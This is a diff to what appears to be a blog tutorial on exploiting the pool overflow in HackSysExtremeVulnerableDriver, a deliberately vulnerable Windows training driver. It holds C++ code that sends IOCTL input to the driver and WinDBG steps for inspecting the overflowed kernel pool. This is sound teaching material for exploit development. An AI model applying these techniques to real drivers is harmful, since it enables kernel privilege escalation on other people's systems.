@@ -47,8 +47,92 @@ PVOID ExAllocatePoolWithTag(
 );
 ```
 
-In our routine all of these parameters are hardcoded for us. `PoolType` is set to `NonPagedPool`, `NumberOfBytes` is set to `0x1F8`, and `Tag` is set to `0x6B636148` ('Hack'). This by itself is fine and there is no vulnerability obviously; however, the driver routine uses `memcpy` to transfer data from the user buffer to this newly allocated non-paged pool kernel buffer and uses the size of the **user buffer** as the size argument. If the size of our user buffer is larger than the kernel buffer, we will overwrite some data in the adjacent non-paged pool.  Here is a screenshot of the function in IDA Free 7.0. 
+In our routine all of these parameters are hardcoded for us. `PoolType` is set to `NonPagedPool`, `NumberOfBytes` is set to `0x1F8`, and `Tag` is set to `0x6B636148` ('Hack'). This by itself is fine and there is no vulnerability obviously; however, the driver routine uses `memcpy` to transfer data from the user buffer to this newly allocated non-paged pool kernel buffer and uses the size of the **user buffer** as the size argument. (This precisely the bug in the Jungo driver that @steventseeley discovered via fuzzing.) If the size of our user buffer is larger than the kernel buffer, we will overwrite some data in the adjacent non-paged pool.  Here is a screenshot of the function in IDA Free 7.0. 
 
 ![](/assets/images/AWE/poolover1.PNG)
+
+Nothing too complicated reversing wise, we can even see that right after our pool buffer is allocated, it is de-allocated with `ExFreePoolWithTag`.
+
+If we call the function with the following skeleton code, we will see in WinDBG that everything works as normal and we can start trying to understand how the pool chunks are structured. 
+```cpp
+#include <iostream>
+#include <Windows.h>
+
+using namespace std;
+
+#define DEVICE_NAME         "\\\\.\\HackSysExtremeVulnerableDriver"
+#define IOCTL               0x22200B
+
+
+HANDLE grab_handle() {
+
+    HANDLE hFile = CreateFileA(DEVICE_NAME,
+        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        cout << "[!] No handle to HackSysExtremeVulnerableDriver\n";
+        exit(1);
+    }
+
+    cout << "[>] Grabbed handle to HackSysExtremeVulnerableDriver: " << hex
+        << hFile << "\n";
+
+    return hFile;
+}
+
+void send_payload(HANDLE hFile) {
+
+    ULONG payload_len = 0x1F8;
+
+    LPVOID input_buff = VirtualAlloc(NULL,
+        payload_len + 0x1,
+        MEM_RESERVE | MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE);
+
+    memset(input_buff, '\x42', payload_len);
+
+    cout << "[>] Sending buffer size of: " << dec << payload_len << "\n";
+
+    DWORD bytes_ret = 0;
+
+    int result = DeviceIoControl(hFile,
+        0x22200F,
+        input_buff,
+        payload_len,
+        NULL,
+        0,
+        &bytes_ret,
+        NULL);
+
+    if (!result) {
+
+        cout << "[!] DeviceIoControl failed!\n";
+
+    }
+}
+
+int main() {
+
+    HANDLE hFile = grab_handle();
+
+    send_payload(hFile);
+
+    return 0;
+}
+```
+
+I set a breakpoint at offset 0x4D64 with this command in WinDBG: `bp !HEVD+4D64` which is right after the `memcpy` operation and we see that our pool buffer has been filled with our `\x42` characters. At this point a pointer to the allocated kernel buffer is still in `eax` so we can go to that location with the `!pool` command which will start at the beginning of that page of memory and display certain aspects of the memory allocated there.
+
+![](/assets/images/AWE/poolover2.PNG)
+
+
+
+
+
 
 
